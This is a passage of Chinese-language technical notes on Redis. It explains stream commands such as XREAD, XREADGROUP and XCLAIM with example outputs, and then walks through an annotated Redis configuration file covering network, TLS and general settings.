+ COUNT 2\n     1) 1) 1526985676425-0\n        2) 1) \"name\"\n           2) \"Virginia\"\n           3) \"surname\"\n           4) \"Woolf\"\n     2) 1) 1526985685298-0\n        2) 1) \"name\"\n           2) \"Jane\"\n           3) \"surname\"\n           4) \"Austen\"\n     > XRANGE writers (1526985685298-0 + COUNT 2\n     1) 1) 1526985691746-0\n        2) 1) \"name\"\n           2) \"Toni\"\n           3) \"surname\"\n           4) \"Morrison\"\n     2) 1) 1526985712947-0\n        2) 1) \"name\"\n         2) \"Agatha\"\n           3) \"surname\"\n         4) \"Christie\"\n     ```\n\n  2. 获取单个项目\n\n     XRANGE 的参数中指定两次 ID：`XRANGE mystream 1526984818136-0 1526984818136-0`\n\n## <span id=\"STREAM_XREVRANGE\">XREVRANGE</span>\n\n- 详细命令\n\n  XREVRANGE key end start [COUNT count]\n\n- 举例\n\n  ```sh\n  XREVRANGE somestream + - COUNT 1\n  ```\n\n\n\n## <span id=\"STREAM_XREAD\">XREAD</span>\n\n- 命令详情\n\n  **XREAD** [**COUNT** count] <font color=\"green\">[**BLOCK** milliseconds]</font> <font color=\"blue\">**STREAMS** key [key ...] id\n  [id ...]</font>\n\n- 命令参数解释\n\n  **STREAMS** key [key ...] id [id ...]：指定了一个键列表以及调用消费者已经为每个流看到的相应最大 ID，因此该命令将只向客户端提供 ID  `大于`我们指定的 ID 的消息。（不包含指定的ID）\n\n  [**BLOCK** milliseconds]：阻塞的毫秒数。若milliseconds 设置为0 ，则表示永远不会超时\n\n  [**COUNT** count]：限定调用将在每个流中最多返回count个元素\n\n- 特殊的ID`$`\n\n  **STREAMS** \\$ :  意味着应该使用已经存储在流中的最大 ID 作为最后一个 ID。\n\n  当阻塞时，有时我们希望只接收从阻塞那一刻开始通过XADD添加到流中的条目。在这种情况下，我们对已经添加的条目的历史不感兴趣。\n\n  对于这个用例，我们必须检查流顶部元素的ID，并在XREAD命令行中使用这样的ID。这是不干净的，需要调用其他命令，所以可以使用特殊的 `$` 来通知流，我们只想要新的东西。\n\n  **仅在第一次调用 XREAD 时使用 $ ID 非常重要。之后迭代的ID应该是流中最后报告的ID，否则您可能会错过中间添加的所有条目。**\n\n  | 客户端A                                                     | 客户端B                                                     | 客户端C                                              |\n  | ----------------------------------------------------------- | ----------------------------------------------------------- | ---------------------------------------------------- |\n  | > XREAD COUNT 1 block 30000 STREAMS test $                  | > XREAD COUNT 1 block 30000 STREAMS test $                  |                                                      |\n  |                                                             |                                                             | > xadd test * name wangwu age 22<br/>1675666852907-0 |\n  | test<br/>1675666852907-0<br/>name<br/>wangwu<br/>age<br/>22 | test<br/>1675666852907-0<br/>name<br/>wangwu<br/>age<br/>22 |                                                      |\n\n  > 客户端C 发送消息时，阻塞等待的客户端A、客户端B 均接受到了流中新增条目\n\n\n\n- 使用场景\n\n  1. 非阻塞情况：从多个流读取数据（XRANGE 的扩展版本）\n\n     ```sh\n     > XREAD COUNT 2 STREAMS mystream writers 0-0 0-0\n     1) 1) \"mystream\"\n        2) 1) 1) 1526984818136-0\n              2) 1) \"duration\"\n                 2) \"1532\"\n                 3) \"event-id\"\n                 4) \"5\"\n                 5) \"user-id\"\n                 6) \"7782813\"\n           2) 1) 1526999352406-0\n              2) 1) \"duration\"\n                 2) \"812\"\n                 3) \"event-id\"\n                 4) \"9\"\n                 5) \"user-id\"\n                 6) \"388234\"\n     2) 1) \"writers\"\n        2) 1) 1) 1526985676425-0\n              2) 1) \"name\"\n                 2) \"Virginia\"\n                 3) \"surname\"\n                 4) \"Woolf\"\n           2) 1) 1526985685298-0\n              2) 1) \"name\"\n                 2) \"Jane\"\n                 3) \"surname\"\n                 4) \"Austen\"\n     ```\n\n  2. 阻塞情况下：（无返回数据的情况下，等待数据返回）\n\n     消费者第一次迭代：从我们开始收听的时间开始，阻塞等待最新消息\n\n     ```sh\n     > XREAD BLOCK 5000 COUNT 100 STREAMS mystream $\n     ```\n\n     一旦我们得到一些回复，下一次调用将是这样的：阻塞等待`1526999644174-3`之后的数据\n\n     ```sh\n     > XREAD BLOCK 5000 COUNT 100 STREAMS mystream 1526999644174-3\n     ```\n\n\n\n- 如何为单个流上被阻止的多个客户端提供服务：**FIFO**\n\n  1. 当新项目可用时，为给定流阻塞的第一个客户端将是第一个被解除阻塞的客户端。因为从等待数据的客户端的角度来看，阻塞流读取是公平的，其语义是 FIFO 风格。（类似于阻塞队列）\n\n  2. 为客户端提供服务时，不会从流中删除流条目，因此只要 XADD 命令向流提供数据，就会为每个等待的客户端提供服务。（不同于阻塞队列）\n\n     \n\n## <span id=\"STREAM_XTRIM\"> XTRIM</span>\n\n- 命令详情\n\n  **XTRIM** *key* <MAXLEN | MINID> [= | ~] threshold [LIMIT count]\n\n- 命令参数解释\n\n  MAXLEN:  只要流的长度超过指定的阈值，就逐出条目，其中阈值是一个正整数。\n\n  MINID: 驱逐 ID 低于阈值的条目，其中阈值是流 ID。\n\n- 返回：成功移除数据量\n\n- 示范\n\n  1. 精确修剪`=`\n\n     ```sh\n     XTRIM mystream MAXLEN 1000\n     XTRIM mystream MINID 649085820\n     ```\n\n  2. 近乎精确的修剪\n\n     ```sh\n     XTRIM mystream MAXLEN ~ 1000\n     ```\n\n\n\n## <span id=\"STREAM_XINFO\"> XINFO</span>\n\n### XINFO STREAM\n\n- 命令详情\n\n  **XINFO STREAM** key [FULL [COUNT count]]： \n\n- 此命令返回有关存储在 <key> 中的流的信息。详细信息是：\n\n  - **length**: 流中的条目数\n  - **radix-tree-keys**: 底层基数数据结构中的键数\n  - **radix-tree-nodes**: 底层基数数据结构中的节点数\n  - **groups**: 底层基数数据结构中的节点数 groups：为流定义的消费者组数\n  - **last-generated-id**:添加到流中的最近条目的 ID\n  - **max-deleted-entry-id**: 从流中删除的最大条目 ID\n  - **entries-added**: 在其生命周期内添加到流中的所有条目的计数\n  - **first-entry**: 流中第一个条目的 ID 和字段值元组\n  - **last-entry**: 流中最后一个条目的 ID 和字段值元组\n\n### XINFO GROUPS\n\n- 命令详情\n\n  XINFO GROUPS key\n\n### XINFO CONSUMERS\n\n- 命令详情\n\n  XINFO CONSUMERS key groupname\n\n  \n\n## <span id=\"STREAM_GROUP\"> XGROUP</span>\n\n- **XGROUP** 用于创建、销毁和管理消费者组。 \n\n- **XREADGROUP** 用于通过消费者组从流中读取。\n\n- **XACK** 是允许消费者将未决消息标记为已正确处理的命令。\n\n  \n\n### <span id=\"STREAM_XGROUP_CREATE\"> XGROUP CREATE</span>\n\n\n- 命令详情\n\n  **XGROUP CREATE** key groupname  <font color=\"blue\"> <**id | \\$** > </font>  <font color=\"green\">[**MKSTREAM**]</font>  **[ENTRIESREAD entries_read]**\n\n- 参数说明\n\n  1. <font color=\"blue\"> <**id | \\$** > </font> ：从新组的角度指定流中最后传送的条目。\n\n     例如，如果您希望组的消费者从头开始获取整个流，使用零作为消费者组的起始 ID。特殊 ID `$` 是指流中最后一个条目的 ID\n\n  2. <font color=\"green\">[**MKSTREAM**]</font>: 流不存在时，自动创建，否则返回 key不存在的异常\n\n     ```sh\n     ERR The XGROUP subcommand requires the key to exist. Note that for CREATE you may want to use the MKSTREAM option to create an empty stream automatically.\n     ```\n\n  3. **[ENTRIESREAD entries_read]**\n\n     从 指定的 <font color=\"blue\"> <**id | \\$** ></font>，到最后一个条目，指定读取的条目容量\n\n- 功能说明\n\n  创建消费者组\n\n### <span id=\"STREAM_XGROUP_CREATECONSUMER\">XGROUP CREATECONSUMER</span>\n\n- 命令详情\n\n  **XGROUP CREATECONSUMER** key groupname consumername\n\n- 功能说明\n\n  在消费者组中创建消费者\n\n### <span id=\"STREAM_XGROUP_DELCONSUMER\">XGROUP DELCONSUMER</span>\n\n- 命令详情\n\n  **XGROUP DELCONSUMER** key groupname consumername\n\n- 功能说明\n\n  在消费者组中删除消费者。消费者拥有的任何待处理消息在被删除后将变得不可领取。因此，强烈建议在从组中删除消费者之前声明或确认任何未决消息。\n\n### <span id=\"STREAM_XGROUP_DESTROY\">XGROUP DESTROY</span>\n\n- 命令详情\n\n  **XGROUP DESTROY** key groupname\n\n- 功能说明\n\n  摧毁一个消费者组。即使有活跃的消费者和待处理的消息，消费者组也会被销毁，因此请确保仅在真正需要时才调用此命令。\n\n### <span id=\"STREAM_XGROUP_SETID\">XGROUP SETID</span>\n\n- 命令详情\n\n  **XGROUP SETID** key groupname  <font color=\"blue\"> <**id | \\$** > </font>  [ENTRIESREAD entries_read]\n\n- 功能说明\n\n  **XGROUP SETID**命令允许修改组的最后一个交付ID，而不必删除和重新创建组。例如，如果你想让消费者组中的消费者重新处理流中的所有消息，你可以将其下一个ID设置为0\n\n  ```sh\n  XGROUP SETID mystream mygroup 0\n  ```\n\n\n\n### <span id=\"STREAM_XREADGROUP\">XREADGROUP</span>\n\n- 命令详情\n\n  **XREADGROUP** **GROUP** group consumer [**COUNT** count] <font color=\"blue\"> [**BLOCK** milliseconds]</font>  [**NOACK**] **STREAMS** key [key ...] <font color=\"orange\">id [id ...]</font>\n\n- 参数说明\n\n  <font color=\"orange\">id [id ...]</font>：\n\n  - 若id为 `>` :  使用者只想接收从未传递给任何其他使用者的消息\n  - 任何其他ID，即 `0` 或任何其他有效ID或不完整ID（仅为毫秒时间部分），客户端访问的是：传递给它但尚未确认的消息（历史记录的概念）。注意，在这种情况下，BLOCK和NOACK都被忽略。\n\n- 功能说明\n\n  使用 `XREADGROUP ` 可以创建**客户端组**来消费到达给定流的消息的不同部分。例如，如果流获得新的条目 A、B 和 C，并且有两个消费者通过消费者组读取消息，一个客户端将获得消息 A 和 C，另一个客户端将获得消息 B。\n\n  但是要实现多个键中读取，您需要在每个流中创建一个具有相同名称的消费者组（不常见的需求）\n\n- 举例\n\n  ```sh\n  > XGROUP CREATE mystream mygroup $ MKSTREAM\n  > XADD mystream * message apple\n  > XADD mystream * message orange\n  > XADD mystream * message strawberry\n  > XADD mystream * message apricot\n  \n  \n  > XRANGE mystream - +\n  1) 1) \"1675738497958-0\"\n     2) 1) \"message\"\n        2) \"apple\"\n  2) 1) \"1675738498027-0\"\n     2) 1) \"message\"\n        2) \"orange\"\n  3) 1) \"1675738498119-0\"\n     2) 1) \"message\"\n        2) \"strawberry\"\n  4) 1) \"1675738498206-0\"\n     2) 1) \"message\"\n        2) \"apricot\"\n        \n        \n  > XREADGROUP GROUP mygroup Alice STREAMS mystream 0\n  1) 1) \"mystream\"\n     2) (empty array)\n  \n  > XADD mystream * message banana\n  \"1675738604129-0\"\n  \n  ## 接收条目\n  > XREADGROUP GROUP mygroup Alice COUNT 1 STREAMS mystream >\n  1) 1) \"mystream\"\n     2) 1) 1) \"1675738667048-0\"\n           2) 1) \"message\"\n              2) \"apple\"\n           \n  ## 已接收但是未确认的历史消息列表\n  > XREADGROUP GROUP mygroup Alice STREAMS mystream 0\n  1) 1) \"mystream\"\n     2) 1) 1) \"1675738667048-0\"\n           2) 1) \"message\"\n              2) \"apple\"\n          \n  ## 确认消息\n  > XACK mystream mygroup 1675738667048-0\n  (integer) 1\n  \n  ## 已接收但是未确认的历史消息列表\n  > XREADGROUP GROUP mygroup Alice STREAMS mystream 0\n  1) 1) \"mystream\"\n     2) (empty array)\n     \n  ```\n\n### <span id=\"STREAM_XACK\"> XACK</span>\n\n- 命令详情\n\n  **XACK** key group id [id ...]\n\n- 功能说明\n\n  `XACK`命令从流使用者组的`Pending Entries List (PEL)`中删除一条或多条消息。\n\n  客户端成功处理了一条消息，之后应该调用`XACK`，这样该消息就不会再次被处理，同时，关于该消息的 `PEL`条目也会被清除，从而从Redis服务器释放内存。\n\n\n\n###  <span id=\"STREAM_XPENDING\">XPENDING</span>\n\n- 命令详情\n\n  **XPENDING** key group [<font color=\"blue\">[IDLE min-idle-time] start end count [consumer]</font>]\n\n- 功能说明\n\n  从消费者组`PEL`中 返回获取了但从未确认的消息信息和条目\n\n  ```sh\n  ## 前期\n  > XGROUP CREATE mystream mygroup $ MKSTREAM\n  > XADD mystream * message apple\n  > XADD mystream * message orange\n  > XADD mystream * message strawberry\n  > XADD mystream * message apricot\n  > XREADGROUP GROUP mygroup Alice COUNT 1 STREAMS mystream >\n  \n  \n  ## 实验\n  > XPENDING mystream mygroup \n  1) (integer) 1\n  2) \"1675739360459-0\"\n  3) \"1675739360459-0\"\n  4) 1) 1) \"Alice\"\n        2) \"1\"\n  > XACK mystream mygroup 1675739360459-0\n  (integer) 1\n  > XPENDING mystream mygroup \n  1) (integer) 0\n  2) (nil)\n  3) (nil)\n  4) (nil)\n  ```\n\n### <span id=\"STREAM_XCLAIM\"> XCLAIM</span>\n\n- 命令详情\n\n  **XCLAIM**  key group consumer  min-idle-time  id [id ...]  [**IDLE** ms]\n    [**TIME** unix-time-milliseconds] [**RETRYCOUNT** count] [**FORCE**] [**JUSTID**]\n    [**LASTID** id]\n\n- 功能说明\n\n  此命令用于更改待处理消息的 所有权。通常情况是这样的\n\n  1. `STREAM` 存在关联消费者组 `group_a`\n  2. 某个`consumer_a `在`group_a`的上下文中通过 `XREADGROUP` 从流中读取消息。\n  3. 在`group_a`的待处理条目列表 (PEL) 中创建了一个待处理的消息条目：这意味着消息已传递给`consumer_a `，但尚未通过` XACK` 确认\n  4. 然后突然之间，`consumer_a `永远地失败了\n  5. 其他消费者可能会使用`XPENDING`命令检查挂起的消息列表，这些消息已经过期很长时间了。为了继续处理此类消息，它们使用XCLAIM获取消息的所有权并继续。使用者还可以使用`XAUTOCLAIM`命令自动扫描和声明过期的待处理消息。\n\n  XCLAIM在以下情况下不会声明消息\n\n  1. 消息在组PEL中不存在(即它从未被任何消费者读取)\n  2. 消息存在于组PEL中，但不存在于流本身(即消息被读取但从未被确认，然后通过修剪或XDEL从流中删除)\n\n- 命令参数\n\n  该命令有多个选项，但大多数主要用于内部使用，以便将`XCLAIM`或其他命令的效果传输到AOF文件中，并将相同的效果传播到副本中。\n\n  1. **IDLE <ms>**: 设置消息的空闲时间(最后一次发送)。如果没有指定IDLE，则假设IDLE为0，也就是说，时间计数将被重置，因为消息现在有一个新的所有者试图处理它。\n  2. **TIME <ms-unix-time>**: 这与IDLE相同，但不是相对的毫秒数，它将空闲时间设置为特定的Unix时间(以毫秒为单位)。这对于重写生成`XCLAIM`命令的AOF文件非常有用。\n\n  3. **RETRYCOUNT <count>**: 设置重试次数为指定值。每当再次传递消息时，此计数器都会增加。通常XCLAIM不会改变这个计数器，它只在调用`XPENDING`命令时提供给客户端:这样客户端就可以检测到异常情况，比如在尝试大量传递后由于某种原因从未处理过的消息。\n\n  4. **FORCE**: 在PEL中创建挂起的消息条目，即使某些指定的id还没有在分配给不同客户端的PEL中。但是消息必须在流中存在，否则不存在的消息id将被忽略。\n  5. **JUSTID**:  只返回成功声明的消息的id数组，而不返回实际的消息。使用此选项意味着重试计数器不增加。\n\n- 使用举例：\n\n  ```sh\n  > XPENDING mystream mygroup \n  1) (integer) 0\n  2) (nil)\n  3) (nil)\n  4) (nil)\n  \n  > XREADGROUP GROUP mygroup Alice COUNT 1 STREAMS mystream >\n  1) 1) \"mystream\"\n     2) 1) 1) \"1675739360699-0\"\n           2) 1) \"message\"\n              2) \"apricot\"\n  > XPENDING mystream mygroup \n  1) (integer) 1\n  2) \"1675739360699-0\"\n  3) \"1675739360699-0\"\n  4) 1) 1) \"Alice\"\n        2) \"1\" \n  \n  > XCLAIM mystream mygroup Bob 300 1675739360699-0\n  1) 1) \"1675739360699-0\"\n     2) 1) \"message\"\n        2) \"apricot\"\n  \n   \n  ## 使用 XCLAIM 之后 1675739360699-0 的消费者由 Alice 变更为 Bob\n  > XPENDING mystream mygroup \n  1) (integer) 1\n  2) \"1675739360699-0\"\n  3) \"1675739360699-0\"\n  4) 1) 1) \"Bob\"\n        2) \"1\"\n  \n  ```\n\n### <span id=\"STREAM_XAUTOCLAIM\">XAUTOCLAIM </span>\n\n- 命令详情\n\n  **XAUTOCLAIM** key group consumer  min-idle-time  start [**COUNT** count]\n    [**JUSTID**]\n\n- 功能说明\n\n  从概念上讲，XAUTOCLAIM 等同于调用XPENDING，然后调用XCLAIM\n\n\n\n# 基础命令：<span id=\"Order_SCAN\">SCAN</span>\n\n- 命令详情\n\n  **SCAN** cursor [**MATCH** pattern] [**COUNT** count] [**TYPE** type]\n\n- 命令参数解释\n\n  cursor ：开始迭代时的光标值为 0 / 上一次调用 SCAN 返回的光标以继续迭代\n\n  **TYPE** type：您可以使用 TYPE 选项要求 SCAN 仅返回与给定类型匹配的对象，从而允许您遍历数据库以查找特定类型的键。TYPE 选项仅在整个数据库 SCAN 上可用，而不是 HSCAN 或 ZSCAN 等。\n\n- 使用DEMO\n\n  ```sh\n  redis 127.0.0.1:6379> sadd myset 1 2 3 foo foobar feelsgood\n  (integer) 6\n  redis 127.0.0.1:6379> sscan myset 0 match f*\n  1) \"0\"\n  2) 1) \"foo\"\n     2) \"feelsgood\"\n     3) \"foobar\"\n  redis 127.0.0.1:6379>\n  ```\n\n  重要的是要注意**MATCH**过滤器是在从集合中检索到元素之后应用的，就在将数据返回给客户端之前。\n\n  这意味着如果模式匹配集合中的极少元素，`SCAN`则在大多数迭代中可能不会返回任何元素。一个例子如下所示：\n\n  ```sh\n  redis 127.0.0.1:6379> scan 0 MATCH *11*\n  1) \"288\"\n  2) 1) \"key:911\"\n  redis 127.0.0.1:6379> scan 288 MATCH *11*\n  1) \"224\"\n  2) (empty list or set)\n  redis 127.0.0.1:6379> scan 224 MATCH *11*\n  1) \"80\"\n  2) (empty list or set)\n  redis 127.0.0.1:6379> scan 80 MATCH *11*\n  1) \"176\"\n  2) (empty list or set)\n  redis 127.0.0.1:6379> scan 176 MATCH *11* COUNT 1000\n  1) \"0\"\n  2)  1) \"key:611\"\n      2) \"key:711\"\n      3) \"key:118\"\n      4) \"key:117\"\n      5) \"key:311\"\n      6) \"key:112\"\n      7) \"key:111\"\n      8) \"key:110\"\n      9) \"key:113\"\n     10) \"key:211\"\n     11) \"key:411\"\n     12) \"key:115\"\n     13) \"key:116\"\n     14) \"key:114\"\n     15) \"key:119\"\n     16) \"key:811\"\n     17) \"key:511\"\n     18) \"key:11\"\n  redis 127.0.0.1:6379>\n  ```\n\n  如您所见，大多数调用返回零元素，但最后一次调用使用 COUNT 为 1000 以强制命令对该迭代进行更多扫描\n","tags":["Redis"],"categories":["数据库","Redis"]},{"title":"Redis-配置文件","url":"/20250619/6b8605c4.html","content":"\n# 官方模板文件\n\n参考：https://redis.io/docs/management/config-file/\n\n各版本参数变更：https://docs.aws.amazon.com/zh_cn/AmazonElastiCache/latest/red-ug/ParameterGroups.Redis.html\n\n# 具体配置项\n\n## INCLUDES：引入自定义配置文件\n\n如果你有一个适用于所有Redis服务器的标准模板，但也需要自定义一些每个服务器的设置，可以使用 `include ` 配置\n\n选项`include`不会被命令`CONFIG REWRITE`从管理或Redis哨兵重写。由于Redis总是使用最后处理的行作为配置指令的值，你最好把`include`放在配置文件的开头，以避免在运行时覆盖配置更改。\n\n```properties\n################################## INCLUDES ###################################\n# include /path/to/local.conf\n# include /path/to/other.conf\n# include /path/to/fragments/*.conf\n```\n\n## MODULES\n\n在启动时加载模块。如果服务器不能加载模块，它将中止。可以使用多个`loadmodule`指令。\n\n通过Redis Module可以扩展Redis本身的能力，能够实现一些Redis本身不支持的命令\n\n```properties\n################################## MODULES #####################################\n# loadmodule /path/to/my_module.so\n# loadmodule /path/to/other_module.so\n```\n\n##  NETWORK：网络配置\n\n```sh\n################################## NETWORK #####################################\n# 默认情况下，如果没有指定bind配置指令，Redis将监听来自主机上所有可用网络接口的连接。\n# 可以使用bind配置指令监听一个或多个选定的接口，后面跟着一个或多个IP地址。\n# 不可用仅指不对应于任何网络接口的地址。已经在使用的地址将总是失败，不支持的协议将无法访问。\n# Examples:\n#\n# bind 192.168.1.100 10.0.0.1     # listens on two specific IPv4 addresses\n# bind 127.0.0.1 ::1              # listens on loopback IPv4 and IPv6\n# bind * -::*                     # like the default, all available interfaces\n#\n# ~~~ WARNING ~~~ \n# 如果运行Redis的计算机直接暴露在互联网上，绑定到所有接口是危险的，并将实例暴露给互联网上的每个人。\n# 所以默认情况下，我们取消注释下面的bind指令，这将迫使Redis只监听IPv4和IPv6(如果可用)环回接口地址(这意味着Redis将只能接受来自其运行的同一主机的客户端连接)。\n#\n# 如果您确定希望您的实例侦听所有接口,注释掉下面一行。\n# 您还需要设置密码，除非您显式禁用protected模式。\n# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nbind 127.0.0.1 -::1\n\n# 默认情况下，传出连接(从副本到主，从哨兵到实例，集群总线等)不会绑定到特定的本地地址。\n# 在大多数情况下，这意味着操作系统将基于路由进行处理和连接通过的接口。\n#\n# 使用bind-source-addr可以配置要绑定的特定地址,这也可能影响连接的路由方式。举例:\n# bind-source-addr 10.0.0.1\n\n# 保护模式是一层安全保护层, 默认启用。\n# 为了避免打开的Redis实例在互联网上被访问和利用。当开启保护模式且默认用户没有密码时，服务器会自动关闭。\nprotected-mode yes\n\n# Redis使用默认的加固安全配置指令来减少攻击无辜用户。因此，几种敏感配置指令是不可变的，一些潜在危险的命令会被阻塞。\n# 控制Redis写入文件的配置指令(例如，'dir' 和'dbfilename')，并且通常不会在运行时修改。通过使它们不可变来保护它们。\n\n# 通过设置，这些可以暴露给所有连接，也可以只暴露给本地连接\n# 下面列出的每一个配置到这些值中的任意一个:\n#\n# no    - 阻塞任何连接(保持不可变)\n# yes   - 允许任何连接(无保护)\n# local - 只允许本地连接. Ones originating from the IPv4 address (127.0.0.1), IPv6 address (::1) or Unix domain sockets.\n#\n# enable-protected-configs no\n# enable-debug-command no\n# enable-module-command no\n\n# 接受指定端口上的连接，默认为6379 (IANA #815344).\n# IANA: https://www.iana.org 互联网地址编码分配机构\n# 如果指定了端口0,Redis将不会监听TCP套接字。\nport 6379\n\n# TCP listen() backlog.\n#\n# 在每秒请求数高的环境中，您需要大量的积压，以避免客户端连接速度慢的问题。\n# 请注意，Linux内核会将其静默地截断为/proc/sys/net/core/somaxconn的值（cat /proc/sys/net/core/somaxconn）\n# 因此请确保同时提高somaxconn和tcp_max_syn_backlog（cat /etc/sysctl.conf）的值，以便获得所需的效果。\ntcp-backlog 511\n\n# Unix socket.\n# 指定用于侦听传入连接的Unix套接字的路径。没有默认值，所以如果没有指定，Redis将不会监听unix套接字。\n#\n# unixsocket /run/redis.sock\n# unixsocketperm 700\n\n# 在客户端空闲N秒后关闭连接(0为禁用)\ntimeout 0\n\n# TCP keepalive.\n#\n# 如果非零，在没有通信的情况下使用SO_KEEPALIVE向客户端发送TCP ACKs。这很有用，有两个原因:\n# 1) 检测失效节点\n# 2) 强制中间的网络设备认为连接是活的。\n#\n# 在Linux操作系统中，该值(单位为秒)为发送ACK的周期。注意，关闭连接需要两倍的时间。在其他内核上，周期取决于内核配置。\n# 这个选项的合理值是300秒。从Redis 3.2.1开始，是新的Redis默认值\ntcp-keepalive 300\n\n# 应用操作系统特有的机制，用指定的ID标记监听套接字，以支持高级路由和过滤功能。\n#\n# 在Linux上，ID表示一个连接标记\n# 在FreeBSD上，ID表示套接字cookie ID。\n# 在OpenBSD上，ID表示路由表ID。\n\n# 默认值是0，这意味着不需要标记。\n# socket-mark-id 0\n```\n\n\n\n## TLS/SSL\n\n```sh\n################################# TLS/SSL #####################################\n# 默认情况下，TLS/SSL协议处于禁用状态。要启用它，可以使用“tls-port”配置指令定义tls侦听端口。port指定了0，则不再监听TCP套接字。\n# 在默认端口上启用TLS，请使用:\n# port 0\n# tls-port 6379\n\n# 配置X.509证书和私钥，用于对连接的客户端、主节点或集群对等体进行服务器身份验证。这些文件应该是PEM格式的。\n# tls-cert-file redis.crt\n# tls-key-file redis.key\n# 如果KEY文件是使用密码短语加密的，那么它也可以包含在这里。\n# tls-key-file-pass secret\n\n# 通常Redis对服务器功能(接受连接)和客户端功能(从主服务器复制，建立集群总线连接等)使用相同的证书。\n# 有时颁发证书时带有将其指定为仅客户端证书或仅服务器证书的属性。在这种情况下，可能需要对传入(服务器)和传出(客户端)连接使用不同的证书。要做到这一点，请使用以下指令:\n# tls-client-cert-file client.crt\n# tls-client-key-file client.key\n# 如果KEY文件是使用密码短语加密的，那么它也可以包含在这里。\n# tls-client-key-file-pass secret\n\n# 配置DH参数文件，开启 DH (Diffie-Hellman) KEY交换功能，这是旧版本OpenSSL(<3.0)的要求。新版本不需要这种配置，建议不要这样做。\n# tls-dh-params-file redis.dh\n\n# 配置CA证书包或目录以验证TLS/SSL客户端和对等体。Redis需要至少其中一个的显式配置，并且不会隐式地使用系统范围的配置。\n# tls-ca-cert-file ca.crt\n# tls-ca-cert-dir /etc/ssl/certs\n\n# 默认情况下，TLS端口上的客户端(包括副本服务器)需要使用有效的客户端证书进行身份验证。\n# - no：则不需要且不接受客户端证书。\n# - optional：则接受客户端证书，并且在提供时必须有效，但不是必需的。\n# tls-auth-clients no\n# tls-auth-clients optional\n\n# 默认情况下，Redis副本不会尝试与其主服务器建立TLS连接。使用下面的指令在复制链路上启用TLS。\n# tls-replication yes\n\n# 默认情况下，Redis集群总线使用普通TCP连接. 要为总线协议启用TLS，请使用以下指令:\n# tls-cluster yes\n\n# 默认情况下，只启用TLSv1.2和TLSv1.3，强烈建议禁用旧的正式弃用版本，以减少攻击面。\n# 您可以显式地指定要支持的TLS版本。允许的值不区分大小写，包括 “TLSv1”，“TLSv1.1”，“TLSv1.2”，\"TLSv1.3\" (OpenSSL >= 1.1.1) 或者任意组合.\n# 如果只启用TLSv1.2和TLSv1.3，请使用:\n# tls-protocols \"TLSv1.2 TLSv1.3\"\n\n# 配置允许的密码。有关此字符串语法的更多信息，请参阅 cipher (1ssl) 手册（ 此配置仅适用于<= TLSv1.2）\n# tls-ciphers DEFAULT:!MEDIUM\n\n# 配置允许使用的TLSv1.3密码套件。有关此字符串语法的更多信息，特别是关于TLSv1.3密码套件的信息，请参阅 cipher (1ssl) 手册\n# tls-ciphersuites TLS_CHACHA20_POLY1305_SHA256\n\n#在选择密码时，使用服务器的首选项而不是客户端首选项。默认情况下，服务器遵循客户端的首选项。\n# tls-prefer-server-ciphers yes\n\n# 默认情况下，启用TLS会话缓存，以允许支持TLS会话缓存的客户端更快、更便宜地重新连接。使用下面的指令禁用缓存。\n# tls-session-caching no\n\n# 修改TLS缓存的默认会话数。零值将缓存设置为无限大小。默认大小为20480。\n# tls-session-cache-size 5000\n\n# 修改TLS缓存会话的默认超时时间。缺省超时时间为300秒。\n# tls-session-cache-timeout 60\n```\n\n\n\n## GENERAL：通用设置\n\n```sh\n################################# GENERAL #####################################\n# 默认情况下，Redis不作为守护进程运行。如果需要，配置为 “yes”\n# Note that Redis will write a pid file in /var/run/redis.pid when daemonized.\n# 注意，Redis会在文件 /var/run/redis.pid 中写入守护时的 pid\n# 当Redis被upstart或systemd监控时，该参数无影响。\ndaemonize no\n\n\n# 如果你从upstart或systemd运行Redis, Redis可以与你的supervision tree交互。这些监督方法只是表明“流程已经准备好了”。他们不允许连续的ping回你的supervisor。\n# 选项:\n#   - no      - no supervision interaction\n#   - upstart - signal upstart by putting Redis into SIGSTOP mode requires \"expect stop\" in your upstart job config\n#   - systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET on startup, and updating Redis status on a regular basis.\n#   - auto    - detect upstart or systemd method based on UPSTART_JOB or NOTIFY_SOCKET environment variables\n#\n# 默认为 “no”。要在 upstart/systemd下运行，你可以简单地取消下面这行代码的注释:\n# supervised auto\n\n# 如果指定了pid文件，Redis在启动时将其写入指定的位置，并在退出时删除它。\n#\n# 如果在配置中没有指定pid文件，那么当服务器运行时，不会创建pid文件。\n# 当服务器被守护时，即使没有指定pid文件，也会使用pid文件，默认为 \"/var/run/redis.pid\"。\n#\n# 正常创建一个pid文件是最好的结果:如果Redis不能创建它，没有什么不好的事情发生，服务器将正常启动和运行。\n# 注意，在现代Linux系统中，\"/run/redis.pid\" 更符合要求，应该用它来代替。\npidfile /var/run/redis_6379.pid\n\n# 指定服务器日志级别\n# - debug：有很多信息，对开发/测试很有用\n# - verbose：许多极少用到的信息，但不像调试级别那样混乱\n# - notice：合理冗余, 但可能是在生产中需要的\n# - warning：只记录非常重要/关键的消息\nloglevel notice\n\n# 指定日志文件名。\n# 空字符串也可以用来强制Redis登录到标准输出。\n# 注意，如果使用标准输出进行日志记录，但是使用daemonize，那么日志将被发送到/dev/null\nlogfile \"\"\n\n# 要启用系统日志记录器，只需将'syslog-enabled'设置为yes，并可选地更新其他系统日志参数以满足您的需要\n# syslog-enabled no\n\n# 指定系统日志标识。\n# syslog-ident redis\n\n# 系统日志记录的级别，必须为USER或LOCAL0-LOCAL7之间。\n# syslog-facility local0\n\n# 要禁用内建的崩溃日志（它可能会在需要时产生更干净的core dumps），取消注释如下:\n# crash-log-enabled no\n\n# 要禁用作为崩溃日志一部分的运行时快速内存检查（这可能会让redis更快地终止），取消以下注释:\n# crash-memcheck-enabled no\n\n#设置数据库数量。默认数据库是 DB 0，您可以使用select <dbid>在每个连接的基础上选择一个不同的数据库，其中dbid是从0开始计数\ndatabases 16\n\n\n# 默认情况下，Redis只在开始记录到标准输出，并且标准输出是TTY, 系统日志记录被禁用，时显示ASCII艺术徽标\n# 基本上，这意味着徽标通常只在交互会话中显示。\n# 然而，通过将以下选项设置为yes，可以强制4.0之前的行为，并始终在启动日志中显示ASCII艺术徽标。\nalways-show-logo no\n\n# 默认情况下，Redis修改进程标题(如'top'和'ps'所示)以提供一些运行时信息。\n# 通过将以下设置为no，可以禁用此功能并保留进程名为已执行。\nset-proc-title yes\n\n# 